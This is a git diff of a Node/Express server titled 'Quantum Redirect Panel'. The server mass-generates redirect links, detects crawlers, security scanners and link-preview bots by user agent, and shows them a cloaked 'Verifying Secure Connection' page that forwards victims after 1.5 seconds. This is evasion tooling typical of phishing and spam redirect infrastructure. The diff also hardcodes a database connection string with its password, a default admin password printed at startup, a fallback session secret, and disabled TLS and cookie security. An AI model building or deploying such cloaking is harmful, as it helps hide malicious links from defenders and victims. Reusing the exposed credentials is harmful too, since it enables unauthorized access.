@@ -11,9 +11,7 @@ const app = express();
 // PostgreSQL connection
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL || 'postgresql://quantum_db_ml2s_user:MPw4AwfSykHaGBGYz5TuwW1QXeHB5mKD@dpg-d8fvelk2m8qs73eeu2ug-a/quantum_db_ml2s',
-  ssl: {
-    rejectUnauthorized: false
-  }
+  ssl: { rejectUnauthorized: false }
 });
 
 // Test database connection
@@ -29,7 +27,6 @@ pool.connect((err, client, release) => {
 // Create tables
 const initDB = async () => {
   try {
-    // Users table
     await pool.query(`
       CREATE TABLE IF NOT EXISTS users (
         id SERIAL PRIMARY KEY,
@@ -40,7 +37,6 @@ const initDB = async () => {
       )
     `);
     
-    // Domains table
     await pool.query(`
       CREATE TABLE IF NOT EXISTS domains (
         id SERIAL PRIMARY KEY,
@@ -53,7 +49,6 @@ const initDB = async () => {
       )
     `);
     
-    // Redirect rules table
     await pool.query(`
       CREATE TABLE IF NOT EXISTS redirect_rules (
         id SERIAL PRIMARY KEY,
@@ -70,7 +65,6 @@ const initDB = async () => {
       )
     `);
     
-    // Generated links table
     await pool.query(`
       CREATE TABLE IF NOT EXISTS generated_links (
         id SERIAL PRIMARY KEY,
@@ -84,7 +78,6 @@ const initDB = async () => {
       )
     `);
     
-    // Click logs table
     await pool.query(`
       CREATE TABLE IF NOT EXISTS click_logs (
         id SERIAL PRIMARY KEY,
@@ -99,7 +92,7 @@ const initDB = async () => {
       )
     `);
     
-    // Create admin user if not exists
+    // Create admin user
     const hashedPassword = bcrypt.hashSync('Quantum2024!', 10);
     await pool.query(`
       INSERT INTO users (username, email, password) 
@@ -118,13 +111,13 @@ initDB();
 // Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static('public'));
+app.use(express.static(path.join(__dirname, 'public')));
 app.use(session({
   secret: process.env.SESSION_SECRET || 'quantum_secret_key',
   resave: false,
   saveUninitialized: false,
   cookie: { 
-    secure: process.env.NODE_ENV === 'production',
+    secure: false,  // Set to false for Render (since it handles SSL)
     httpOnly: true,
     maxAge: 24 * 60 * 60 * 1000
   }
@@ -174,16 +167,12 @@ function generateLongSeo(fullDomain, targetUrl, slug, ruleId) {
 
 function isBot(userAgent) {
   if (!userAgent) return true;
-  
   const botPatterns = [
     /bot/i, /crawl/i, /spider/i, /scrape/i, /scan/i,
-    /facebookexternalhit/i, /whatsapp/i, /telegrambot/i, /slackbot/i,
-    /twitterbot/i, /googlebot/i, /bingbot/i, /baiduspider/i,
-    /yandexbot/i, /ahrefsbot/i, /semrushbot/i, /mj12bot/i,
-    /rogerbot/i, /exabot/i, /fastbot/i, /gigabot/i,
+    /facebookexternalhit/i, /whatsapp/i, /telegrambot/i,
+    /googlebot/i, /bingbot/i, /baiduspider/i,
     /python/i, /curl/i, /wget/i, /go-http-client/i
   ];
-  
   return botPatterns.some(pattern => pattern.test(userAgent));
 }
 
@@ -194,17 +183,16 @@ function getCloakedPage(targetUrl, ruleId) {
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="robots" content="noindex,nofollow,noarchive">
   <title>Verifying Secure Connection...</title>
   <style>
     *{margin:0;padding:0;box-sizing:border-box}
     body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
       min-height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
+      font-family: Arial, sans-serif;
     }
     .container { text-align: center; color: white; }
     .loader {
@@ -217,31 +205,27 @@ function getCloakedPage(targetUrl, ruleId) {
       margin: 20px auto;
     }
     h2 { font-size: 24px; margin-bottom: 10px; }
-    p { font-size: 14px; opacity: 0.9; }
     @keyframes spin { to { transform: rotate(360deg); } }
   </style>
-  <script>
-    setTimeout(function() {
-      window.location.href = '${targetUrl}';
-    }, 1500);
-  </script>
+  <script>setTimeout(function(){ window.location.href = '${targetUrl}'; }, 1500);</script>
 </head>
 <body>
   <div class="container">
     <div class="loader"></div>
     <h2>Verifying Secure Connection</h2>
-    <p>Please wait while we redirect you...</p>
   </div>
 </body>
 </html>`;
 }
 
-// ============ SERVE STATIC FILES ============
+// ============ ROUTES ============
 
+// Serve login page
 app.get('/login', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
+// Handle login
 app.post('/login', async (req, res) => {
   const { username, password } = req.body;
   try {
@@ -259,11 +243,13 @@ app.post('/login', async (req, res) => {
   }
 });
 
+// Serve dashboard
 app.get('/dashboard.html', (req, res) => {
   if (!req.session.userId) return res.redirect('/login');
   res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
 });
 
+// Logout
 app.get('/logout', (req, res) => {
   req.session.destroy();
   res.redirect('/login');
@@ -271,7 +257,6 @@ app.get('/logout', (req, res) => {
 
 // ============ API ROUTES ============
 
-// Get all domains
 app.get('/api/domains', async (req, res) => {
   if (!req.session.userId) return res.status(401).json([]);
   try {
@@ -282,7 +267,6 @@ app.get('/api/domains', async (req, res) => {
   }
 });
 
-// Add domain
 app.post('/api/domains', async (req, res) => {
   if (!req.session.userId) return res.status(401).json({ error: 'Unauthorized' });
   const { domain } = req.body;
@@ -296,7 +280,6 @@ app.post('/api/domains', async (req, res) => {
   }
 });
 
-// Generate URLs
 app.post('/api/generate', async (req, res) => {
   if (!req.session.userId) return res.status(401).json({ error: 'Unauthorized' });
   
@@ -320,7 +303,7 @@ app.post('/api/generate', async (req, res) => {
     const urls = [];
     
     for (let i = 0; i < count; i++) {
-      const uniqueSlug = `${slug}_${i}_${crypto.randomBytes(4).toString('hex')}`;
+      const uniqueSlug = `${slug}_${i}`;
       let generatedUrl = '';
       
       switch(style) {
@@ -357,7 +340,6 @@ app.post('/api/generate', async (req, res) => {
   }
 });
 
-// Get rules
 app.get('/api/rules', async (req, res) => {
   if (!req.session.userId) return res.status(401).json([]);
   try {
@@ -374,18 +356,6 @@ app.get('/api/rules', async (req, res) => {
   }
 });
 
-// Delete rule
-app.delete('/api/rules/:id', async (req, res) => {
-  if (!req.session.userId) return res.status(401).json({ error: 'Unauthorized' });
-  try {
-    await pool.query('DELETE FROM redirect_rules WHERE id = $1 AND user_id = $2', [req.params.id, req.session.userId]);
-    res.json({ success: true });
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// Get stats
 app.get('/api/stats', async (req, res) => {
   if (!req.session.userId) return res.status(401).json({});
   try {
@@ -399,22 +369,6 @@ app.get('/api/stats', async (req, res) => {
     });
   } catch (err) {
     res.json({ domains: 0, rules: 0, clicks: 0 });
-  }
-});
-
-// Get logs
-app.get('/api/logs', async (req, res) => {
-  if (!req.session.userId) return res.status(401).json([]);
-  try {
-    const result = await pool.query(`
-      SELECT l.*, r.full_domain, r.target_url
-      FROM click_logs l
-      LEFT JOIN redirect_rules r ON l.rule_id = r.id
-      ORDER BY l.created_at DESC LIMIT 100
-    `);
-    res.json(result.rows);
-  } catch (err) {
-    res.json([]);
   }
 });
 
@@ -434,7 +388,6 @@ app.get('*', async (req, res) => {
         `INSERT INTO click_logs (rule_id, ip, user_agent, is_bot) VALUES ($1, $2, $3, $4)`,
         [ruleId, ip, userAgent.substring(0, 500), isBotDetected ? 1 : 0]
       );
-      
       if (ruleId) {
         await pool.query('UPDATE redirect_rules SET clicks = clicks + 1 WHERE id = $1', [ruleId]);
       }
@@ -454,13 +407,12 @@ app.get('*', async (req, res) => {
 
 // Start server
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
+app.listen(PORT, '0.0.0.0', () => {
   console.log('\n========================================');
   console.log('⚡ QUANTUM REDIRECT PANEL');
   console.log('========================================');
-  console.log(`📍 URL: https://your-app.onrender.com/login`);
+  console.log(`📍 URL: https://quantum-redirect-pn05.onrender.com/login`);
   console.log(`👤 Username: admin`);
   console.log(`🔑 Password: Quantum2024!`);
-  console.log(`🗄️  Database: PostgreSQL`);
   console.log('========================================\n');
 });
